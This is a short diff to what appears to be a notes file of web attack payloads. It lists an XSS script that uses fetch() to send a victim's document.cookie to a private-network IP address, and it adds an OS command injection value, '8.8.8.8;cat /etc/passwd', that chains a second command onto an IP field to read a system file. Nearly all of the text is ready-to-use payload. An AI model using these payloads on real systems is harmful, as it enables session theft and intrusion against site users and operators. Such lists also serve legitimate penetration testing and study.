@@ -3,3 +3,7 @@ sqli
 
 xss
 <script>fetch('http://192.168.10.194/'+document.cookie);</script>
+
+os command injection
+8.8.8.8;cat /etc/passwd
+
